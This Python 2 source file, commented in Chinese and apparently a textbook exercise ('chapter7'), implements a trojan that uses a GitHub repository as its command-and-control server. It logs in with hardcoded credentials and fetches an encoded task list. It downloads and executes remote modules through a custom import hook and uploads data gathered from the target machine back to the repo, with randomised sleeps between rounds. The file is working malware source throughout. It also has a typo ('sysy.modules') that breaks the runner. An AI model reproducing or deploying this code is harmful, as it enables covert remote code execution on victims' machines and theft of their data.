 # -*- coding: utf-8 -*-
import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

"""
木马主体框架，从GitHub上下载配置选项和运行的模块代码
ttp://github3py.readthedocs.io/en/master/repos.html#github3.repos.branch.Branch
 """

trojan_id = "abc"  #唯一标识了木马文件

trojan_config = "%s.json" %trojan_id
data_path = "data/%s/" %trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()

def connect_to_github():
 	"""
 	连接github，对用户进行认证，获取当前的repo和branch的对象提供给其他函数使用
 	"""
 	gh = login(username="qk13warcraft",password = "qk14warcraft")
 	repo = gh.repository("qk13warcraft","chapter7")
 	branch = repo.branch("master")

 	return gh,repo,branch

def get_file_contents(filepath):
 	"""
 	从远程的repo中抓取文件，将文件内容读取到本地变量中
 	"""
 	gh,repo,branch = connect_to_github()
 	tree = branch.commit.commit.tree.recurse()

 	for filename in tree.tree:
 		if filepath in filename.path:
 			print "[*] Found file %s" %filepath
 			blob = repo.blob(filename._json_data['sha'])
 			return blob.content
 	return None


def get_trojan_config():
 	"""
 	获得repo中的远程配置文件，木马解析其中的内容获得需要运行的模块名称
 	"""
 	global configured
 	config_json = get_file_contents(trojan_config)
 	config = json.loads(base64.b64decode(config_json))
 	configured = True

 	for task in config:
 		if task['module'] not in sys.modules:
 			exec("import %s" %task['module'])
 	return config

def store_module_result(data):
 	"""
 	将从目标机器上手机的数据推送到repo中
 	"""
 	gh,repo,branch = connect_to_github()
 	remote_path = "data/%s/%d.data" %(trojan_id,random.randint(1000,100000))
 	repo.create_file(remote_path,"Commit message",base64.b64encode(data))

 	return







class GitImporter(object):
 	"""
 	当python解释器加载不存在的模块时，该类就会被调用
 	"""
 	def __init__(self):
 		self.current_module_code = ""

 	def find_module(self,fullname,path=None):
 		"""
 		尝试获取模块所在的位置
 		"""
 		if configured:
 			print "[*] Attempting to retrieve %s" %fullname
 			new_library = get_file_contents("modules/%s" %fullname)

 			#如果能定位到所需的模块文件，则对其中的内容进行解密并将结果保存到该类中
 			#通过返回self变量，告诉python解释器找到了所需的模块
 			if new_library is not None:
 				self.current_module_code = base64.b64decode(new_library)
 				return self

 		return None

 	def load_module(self,name):
 		"""
 		完成模块的实际加载过程，先利用本地的imp模块创建一个空的模块对象，然后将GitHub中获得的代码导入到
 		这个对象中，最后，将这个新建的模块添加到sys.modules列表中，这样在之后的代码中就可以 import 方法
 		调用这个模块了
 		"""
 		module = imp.new_module(name)
 		exec self.current_module_code in module.__dict__
 		sys.modules[name] = module

 		return module

def module_runner(module):
 	task_queue.put(1)
 	result = sysy.modules[module].run()
 	task_queue.get()

 	#保存结果到我们的repo中
 	store_module_result(result)

 	return

#木马的主循环
sys.meta_path = [GitImporter()]

while True:
 	if task_queue.empty():
 		config = get_trojan_config()

 		for task in config:
 			t = threading.Thread(target=module_runner,args=(task['module'],))
 			t.start()
 			time.sleep(random.randint(1,10))
 	time.sleep(random.randint(1000,10000))